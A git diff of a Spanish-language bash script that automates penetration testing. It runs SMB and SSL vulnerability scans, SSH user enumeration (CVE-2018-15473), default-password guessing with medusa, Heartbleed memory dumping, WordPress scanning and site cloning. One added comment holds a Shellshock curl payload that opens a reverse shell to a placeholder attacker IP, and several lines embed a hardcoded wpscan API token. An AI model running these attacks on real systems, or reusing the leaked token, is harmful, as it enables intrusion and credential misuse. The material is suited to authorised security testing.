@@ -1,7 +1,7 @@
 #!/bin/bash
 # Author: Daniel Torres
 # daniel.torres@owasp.org
-##
+# https://github.com/ticarpi/jwt_tool
 # PoC Suite3
 # https://medium.com/tenable-techblog/gpon-home-gateway-rce-threatens-tens-of-thousands-users-c4a17fd25b97
 # Identificar redes con  http://www.ip-calc.com/
@@ -952,6 +952,7 @@ then
 	#smb-vuln-ms17-010 
 	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'nmap -n -sT -p445 -Pn --script smb-vuln-ms17-010 _target_' >> logs/vulnerabilidades/_target__445_ms17010.txt " --silent
 	interlace -tL servicios/smb_uniq.txt -threads 5 -c "nmap -n -sT -p445 -Pn --script smb-vuln-ms17-010 _target_ >> logs/vulnerabilidades/_target__445_ms17010.txt" --silent
+	#https://pentesting.mrw0l05zyn.cl/explotacion/vulnerabilidades/eternalblue-cve-2017-0144-ms17-010
 
 	#smb-double-pulsar-backdoor 
 	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'nmap -n -sT -p445 -Pn --script smb-double-pulsar-backdoor _target_' > logs/vulnerabilidades/_target__445_doublepulsar.txt 2>/dev/null" --silent
@@ -977,6 +978,9 @@ then
 	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'nmap -n -sT -p445 -Pn --script smb-vuln-ms07-029 _target_' > logs/vulnerabilidades/_target__445_ms07029.txt 2>/dev/null" --silent
 	interlace -tL servicios/smb_uniq.txt -threads 5 -c "nmap -n -sT -p445 -Pn --script smb-vuln-ms07-029 _target_ >> logs/vulnerabilidades/_target__445_ms07029.txt 2>/dev/null" --silent
 
+	# smb-vuln-cve2009-3103
+	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'nmap -n -sT -p445 -Pn --script smb-vuln-cve2009-3103 _target_' > logs/vulnerabilidades/_target__445_ms09050.txt 2>/dev/null" --silent
+	interlace -tL servicios/smb_uniq.txt -threads 5 -c "nmap -n -sT -p445 -Pn --script smb-vuln-cve2009-3103 _target_ >> logs/vulnerabilidades/_target__445_ms09050.txt 2>/dev/null" --silent
 
 	#smbmap anonymous
 	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'smbmap -H _target_ -u anonymous -p anonymous' > logs/vulnerabilidades/_target__445_compartidoSMB.txt 2>/dev/null" --silent
@@ -1014,6 +1018,7 @@ then
 		grep "|" logs/vulnerabilidades/"$ip"_445_ms07029.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_445_ms07029.txt 
 		grep "|" logs/vulnerabilidades/"$ip"_445_ms06025.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_445_ms06025.txt 
 		grep "|" logs/vulnerabilidades/"$ip"_445_cve20177494.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_445_cve201774941.txt 
+		grep "|" logs/vulnerabilidades/"$ip"_445_ms09050.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_445_ms09050.txt
 		grep ":" logs/vulnerabilidades/"$ip"_445_nullsession.txt  > .vulnerabilidades/"$ip"_445_nullsession.txt 
 		grep --color=never "not required" logs/vulnerabilidades/"$ip"_445_smb2Security.txt > .vulnerabilidades/"$ip"_445_smb2Security.txt
 		egrep --color=never "READ|WRITE" logs/vulnerabilidades/"$ip"_445_compartidoSMB.txt | sort | uniq | grep -v '\$' > .vulnerabilidades/"$ip"_445_compartidoSMB.txt		
@@ -1254,6 +1259,11 @@ then
 		echo "nmap -n -sT -p $port $ip --script redis-info" > logs/enumeracion/"$ip"_"$port"_redisInfo.txt 2>/dev/null
 		nmap -Pn -n -p $port $ip --script redis-info >> logs/enumeracion/"$ip"_"$port"_redisInfo.txt 2>/dev/null
 		grep "|" logs/enumeracion/"$ip"_"$port"_redisInfo.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR"  > .enumeracion/"$ip"_"$port"_redisInfo.txt						
+
+		redis-cli -h $ip config get '*' > logs/enumeracion/"$ip"_"$port"_redisConfig.txt 2>/dev/null
+		cat logs/enumeracion/"$ip"_"$port"_redisConfig.txt > .enumeracion/"$ip"_"$port"_redisConfig.txt
+
+
 	done
 	
 	#insert clean data	
@@ -1382,17 +1392,16 @@ fi # telnet
 
 if [ -f servicios/ssh.txt ]
 then
+    echo -e "$OKBLUE #################### SSH (`wc -l servicios/ssh.txt`)######################$RESET"	    
 	echo -e "\t[+] Obtener banner"
 	cat servicios/ssh.txt | cut -d ":" -f1 > servicios/ssh_onlyhost.txt 
 	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "echo -e '\tquit' | nc -w 4 _target_ 22 | strings | uniq> .banners/_target__22.txt 2>/dev/null	" --silent
 	
 	echo -e "\t[+] Probando vulnerabilidad CVE-2018-15473"				
 	#usuario root123445 no existe, si sale "is a valid user" el target no es vulnerable
-	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "enumeracionUsuariosSSH.py --username root123445 --port 22 _target_ > logs/vulnerabilidades/_target__22_CVE15473.txt 2>/dev/null" --silent
+	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "enumeracionUsuariosSSH.py -u root123445 --port 22 _target_ >> logs/vulnerabilidades/'_target_'_22_CVE-2018-15473.txt" --silent
 
 	echo -e "\t[+] Probando passwords"	
-	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "enumeracionUsuariosSSH.py --username root123445 --port 22 _target_ > logs/vulnerabilidades/_target__22_CVE15473.txt 2>/dev/null" --silent
-	
 	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "echo -e '\n medusa -h _target_ -u admin -p admin -M ssh' >> logs/vulnerabilidades/'_target_'_22_passwordDefecto.txt 2>/dev/null" --silent
 	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "medusa -h _target_ -u admin -p admin -M ssh >> logs/vulnerabilidades/'_target_'_22_passwordDefecto.txt 2>/dev/null" --silent
 	
@@ -1405,17 +1414,13 @@ then
 	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "echo -e '\n medusa -h _target_ -u root -e n -M ssh' >> logs/vulnerabilidades/'_target_'_22_passwordDefecto.txt 2>/dev/null" --silent
 	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "medusa -h _target_ -u root -e n -M ssh >> logs/vulnerabilidades/'_target_'_22_passwordDefecto.txt 2>/dev/null" --silent					
 
-fi
 
-if [ -f servicios/ssh.txt ]
-then
-	echo -e "$OKBLUE #################### SSH (`wc -l servicios/ssh.txt`)######################$RESET"	    
+	
 	while read line; do
 		ip=`echo $line | cut -f1 -d":"`		
 		port=`echo $line | cut -f2 -d":"`
 		
-
-		enumeracionUsuariosSSH2.py -U $common_user_list  $ip > logs/vulnerabilidades/"$ip"_"$port"_enumeracionUsuariosSSH2.txt &
+		#enumeracionUsuariosSSH2.py -U $common_user_list  $ip > logs/vulnerabilidades/"$ip"_"$port"_enumeracionUsuariosSSH2.txt &
 
 		#SSHBypass
 		echo -e "\t[+] Probando vulnerabilidad libSSH bypass"	
@@ -1433,13 +1438,14 @@ then
 		fi	
 											
 		echo -e "\t[+] Probando vulnerabilidad CVE-2018-15473"						
-		egrep -iq "is an invalid username" logs/vulnerabilidades/"$ip"_22_CVE15473.txt 2>/dev/null
+		egrep -iq "is an invalid username" logs/vulnerabilidades/"$ip"_22_CVE-2018-15473.txt 2>/dev/null
+		                                #   logs/vulnerabilidades/_target__22_CVE-2018-15473.txt
 		greprc=$?
-		if [[ $greprc -eq 0 ]] ; then			
-			enumeracionUsuariosSSH.py --user root --port 22 $ip >> logs/vulnerabilidades/"$ip"_22_CVE15473.txt 2>/dev/null
-			grep "is a valid" logs/vulnerabilidades/"$ip"_22_CVE15473.txt  > .vulnerabilidades/"$ip"_22_CVE15473.txt
-			enumeracionUsuariosSSH.py -p $port -w $common_user_list  $ip > logs/vulnerabilidades/"$ip"_"$port"_enumeracionUsuariosSSH.txt &			
-
+		if [[ $greprc -eq 0 ]] ; then	
+			echo -e "\t[+] Realizando enumeracion de usuarios mediante la  vulnerabilidad CVE-2018-15473 en $ip"
+			cat logs/vulnerabilidades/"$ip"_22_CVE-2018-15473.txt > .vulnerabilidades/"$ip"_22_CVE-2018-15473.txt 			
+			enumeracionUsuariosSSH.py -p $port -w $common_user_list  $ip > logs/vulnerabilidades/"$ip"_"$port"_enumeracionUsuariosSSH.txt
+			grep "is a valid" logs/vulnerabilidades/"$ip"_"$port"_enumeracionUsuariosSSH.txt > .vulnerabilidades/"$ip"_"$port"_enumeracionUsuariosSSH.txt
 		fi		
 	
 		
@@ -1988,9 +1994,7 @@ then
 						#Borrar lineas que cambian en cada peticion
 						egrep -v "lae-portfolio-header|script|visitas|contador" webClone/http-$subdominio.html > webClone/http2-$subdominio.html
 						mv webClone/http2-$subdominio.html webClone/http-$subdominio.html
-						
-						
-																						
+																																		
 						checksumline=`md5sum webClone/http-$subdominio.html` 							
 						md5=`echo $checksumline | awk {'print $1'}` 													
 						egrep -iq $md5 webClone/checksumsEscaneados.txt
@@ -2061,7 +2065,7 @@ then
 								sleep 1
 								
 								echo -e "\t\t[+] Revisando backups de archivos php ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m php -s 0 -q 1 | egrep --color=never "^200" > .enumeracion/"$subdominio"_"$port"_webarchivos.txt  &
+								web-buster.pl -t $subdominio -p $port -h 40 -d / -m php -s 0 -q 1 | egrep --color=never "^200" > .enumeracion/"$subdominio"_"$port"_webarchivos.txt  &
 								#web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m php -s 0 -q 1 > logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt  
 								#egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt   >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
 								sleep 1
@@ -2212,7 +2216,7 @@ then
 								wpscan  --update
 								echo -e "\t\t\t[+] Revisando vulnerabilidades de wordpress ($subdominio)"
 								wpscan --disable-tls-checks  --enumerate u  --random-user-agent --url http://$subdominio --format json > logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers2.txt
-								wpscan --disable-tls-checks  --random-user-agent --url http://$subdominio/ --enumerate ap,at,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U  > logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt
+								wpscan --disable-tls-checks  --random-user-agent --url http://$subdominio/ --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U  > logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt
 								
 
 								#msfconsole -x "use auxiliary/scanner/http/wordpress_content_injection;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt
@@ -2224,7 +2228,7 @@ then
 									url=`cat logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers2.txt | perl -lne 'print $& if /http(.*?)\. /' |sed 's/\. //g'`
 									
 									wpscan --disable-tls-checks --enumerate u  --random-user-agent --url $url > logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers2.txt									
-									wpscan --disable-tls-checks --random-user-agent --url $url --enumerate ap,at,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U > logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt
+									wpscan --disable-tls-checks --random-user-agent --url $url --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U > logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt
 									
 								fi
 	
@@ -2315,22 +2319,19 @@ then
 								wampServer.pl -url http://$subdominio/ > .enumeracion/"$subdominio"_"$port"_WAMPSERVER.txt &
 							fi
 							###################################	
-				
-						
-							#######  clone site (domain) ####### 									
-							cd webClone
-								echo -e "\t\t[+] Clonando sitio ($subdominio) tardara un rato"	
-								wget -mirror --convert-links --adjust-extension --no-parent -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp,ttf,svg,woff2,css,ico --exclude-directories /calendar,/noticias,/blog,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate http://$subdominio 2>/dev/null
-								rm index.html.orig 2>/dev/null
-							cd ..										
-							###################################							
+															
 						else
 							echo -e "\t\t[+] Redirección, error de proxy detectado o sitio ya escaneado \n"	
 						fi												
 					done #subdominio
-					
-					#######  extract URLs ####### 
+										
+
+					#######  clone site (domain) ####### 									
 					cd webClone
+						echo -e "\t\t[+] Clonando sitio ($subdominio) tardara un rato"	
+						wget -mirror --convert-links --adjust-extension --no-parent -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp,ttf,svg,woff2,css,ico --exclude-directories /calendar,/noticias,/blog,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate http://$subdominio 2>/dev/null
+						rm index.html.orig 2>/dev/null
+
 						echo ""
 						echo -e "\t\t[+] Extrayendo URL de los sitios clonados"	
 						grep --color=never -irao "http://[^ ]*"  * 2>/dev/null| cut -d ":" -f3 | grep --color=never -ia "$DOMINIO" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > http.txt 				     
@@ -2370,7 +2371,7 @@ then
 				curl.pl --url  http://$ip > webClone/http-$ip.html
 				sed -i "s/\/index.php//g" webClone/http-$ip.html
 				sed -i "s/https/http/g" webClone/http-$ip.html				 			
-				sed -i "s/www.//g" webClone/http-$ip.html	# En el caso de que www.dominio.com sae igual a dominio.com		
+				sed -i "s/www.//g" webClone/http-$ip.html	# En el caso de que www.dominio.com sea igual a dominio.com		
 				
 				#Borrar lineas que cambian en cada peticion
 				egrep -v "lae-portfolio-header|script|visitas|contador" webClone/http-$ip.html > webClone/http2-$ip.html
@@ -2422,7 +2423,7 @@ then
 						echo -e "\t\t\t[+] Revisando vulnerabilidades de wordpress ($ip)"
 						wpscan  --update >/dev/null						
 						wpscan --enumerate u  --random-user-agent --url http://$ip --format json > logs/vulnerabilidades/"$ip"_"$port"_wpUsers.txt
-						wpscan --random-user-agent --url http://$ip/ --enumerate ap,at,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U  > logs/vulnerabilidades/"$ip"_"$port"_wpscan.txt
+						wpscan --random-user-agent --url http://$ip/ --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U  > logs/vulnerabilidades/"$ip"_"$port"_wpscan.txt
 								
 						grep "Title"  logs/vulnerabilidades/"$ip"_"$port"_wpscan.txt | cut -d ":" -f2 > .vulnerabilidades/"$ip"_"$port"_pluginDesactualizado.txt
 						grep "XML-RPC seems" logs/vulnerabilidades/"$ip"_"$port"_wpscan.txt | awk '{print $7}' > .vulnerabilidades/"$ip"_"$port"_configuracionInseguraWordpress.txt
@@ -2456,9 +2457,7 @@ then
 					fi
 					###################################		
 					
-					
-								
-					
+																		
 					
 					#######  OWA (ip) ######
 					egrep -qi "Outlook|owa" .enumeracion/"$ip"_"$port"_webData.txt
@@ -2647,7 +2646,7 @@ then
 						sleep 1
 						
 						echo -e "\t\t[+] Revisando archivos de php ($ip -Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m php -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/"$ip"_"$port"_webarchivos.txt
+						web-buster.pl -t $ip -p $port -h 40 -d / -m php -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/"$ip"_"$port"_webarchivos.txt
 						sleep 1
 						
 						if [ $internet == "s" ]; then 
@@ -2883,7 +2882,7 @@ then
 								sleep 1
 								
 								echo -e "\t\t[+] Revisando backups de archivos PHP ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m php -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt 
+								web-buster.pl -t $subdominio -p $port -h 40 -d / -m php -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt 
 								sleep 1
 								
 								egrep -i "is behind" .enumeracion/"$subdominio"_"$port"_wafw00f.txt
@@ -2994,7 +2993,7 @@ then
 								wpscan  --update
 								echo -e "\t\t\t[+] Revisando vulnerabilidades de wordpress ($subdominio)"
 								wpscan --disable-tls-checks  --enumerate u  --random-user-agent --url https://$subdominio --format json > logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers2.txt
-								wpscan --disable-tls-checks  --random-user-agent --url https://$subdominio/ --enumerate ap,at,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U  > logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt
+								wpscan --disable-tls-checks  --random-user-agent --url https://$subdominio/ --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U  > logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt
 								
 								#msfconsole -x "use auxiliary/scanner/http/wordpress_content_injection;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt
 								
@@ -3005,7 +3004,7 @@ then
 									url=`cat logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers2.txt | perl -lne 'print $& if /http(.*?)\. /' |sed 's/\. //g'`
 									
 									wpscan --disable-tls-checks --enumerate u  --random-user-agent --url $url > logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers2.txt									
-									wpscan --disable-tls-checks --random-user-agent --url $url --enumerate ap,at,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U > logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt
+									wpscan --disable-tls-checks --random-user-agent --url $url --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U > logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt
 									
 								fi
 	
@@ -3116,7 +3115,8 @@ then
 							if [[ $greprc -eq 0 ]] ; then						
 								echo -e "\t\ŧ$OKRED[!] Vulnerable a heartbleed \n $RESET"
 								grep "|" logs/vulnerabilidades/"$subdominio"_"$port"_heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$subdominio"_"$port"_heartbleed.txt				
-								heartbleed.py $subdominio -p $port 2>/dev/null | head -100 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' > .vulnerabilidades/"$subdominio"_"$port"_heartbleedRAM.txt						
+								heartbleed.py $subdominio -p $port 2>/dev/null | head -100 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' > .vulnerabilidades/"$subdominio"_"$port"_heartbleedRAM.txt
+								heartbleed.sh $subdominio $port &
 							else							
 								echo -e "\t\t$OKGREEN[i] No vulnerable a heartbleed $RESET"
 							fi
@@ -3218,7 +3218,8 @@ then
 					if [[ $greprc -eq 0 ]] ; then						
 						echo -e "\t$OKRED[!] Vulnerable a heartbleed \n $RESET"
 						grep "|" logs/vulnerabilidades/"$ip"_"$port"_heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$ip"_"$port"_heartbleed.txt				
-						heartbleed.py $ip -p $port 2>/dev/null | head -150 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' |  awk  '{print  $18}' > .vulnerabilidades/"$ip"_"$port"_heartbleedRAM.txt						
+						heartbleed.py $ip -p $port 2>/dev/null | head -150 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' |  awk  '{print  $18}' > .vulnerabilidades/"$ip"_"$port"_heartbleedRAM.txt
+						heartbleed.sh $ip $port &
 					else
 						echo -e "\t$OKGREEN[i] No vulnerable a heartbleed $RESET"
 					fi
@@ -3252,7 +3253,7 @@ then
 						wpscan  --update																		
 						
 						wpscan --disable-tls-checks --enumerate u  --random-user-agent --url https://$ip --disable-tls-checks --format json  > logs/vulnerabilidades/"$ip"_"$port"_wpUsers.txt
-						wpscan --disable-tls-checks --random-user-agent --url https://$ip/ --enumerate ap,at,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U --disable-tls-checks  > .enumeracion/"$ip"_"$port"_wpscanPlugins.txt
+						wpscan --disable-tls-checks --random-user-agent --url https://$ip/ --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U --disable-tls-checks  > .enumeracion/"$ip"_"$port"_wpscanPlugins.txt
 								
 						grep "Title" .enumeracion/"$ip"_"$port"_wpscanPlugins.txt | cut -d ":" -f2 > .vulnerabilidades/"$ip"_"$port"_pluginDesactualizado.txt
 						grep "XML-RPC seems" logs/vulnerabilidades/"$ip"_"$port"_wpscan.txt | awk '{print $7}' > .vulnerabilidades/"$ip"_"$port"_configuracionInseguraWordpress.txt
@@ -3389,7 +3390,7 @@ then
 						sleep 1
 						
 						echo -e "\t\t[+] Revisando backups de archivos de PHP2 ($ip - Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m php -s 1 -q 1 >  logs/enumeracion/"$ip"_"$port"_webarchivos.txt
+						web-buster.pl -t $ip -p $port -h 40 -d / -m php -s 1 -q 1 >  logs/enumeracion/"$ip"_"$port"_webarchivos.txt
 						egrep --color=never "^200" logs/enumeracion/"$ip"_"$port"_webarchivos.txt >> .enumeracion/"$ip"_"$port"_webarchivos.txt
 						sleep 1	
 						
@@ -3861,6 +3862,7 @@ then
 			else				
 				echo -e "\t$OKGREEN[i] No vulnerable a Shellsock $RESET"
 			fi
+			# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/{attacker-IP-address}/{listen-port} 0>&1'" http://{target}/cgi-bin/{vulnerable}
 			
 		done
 	
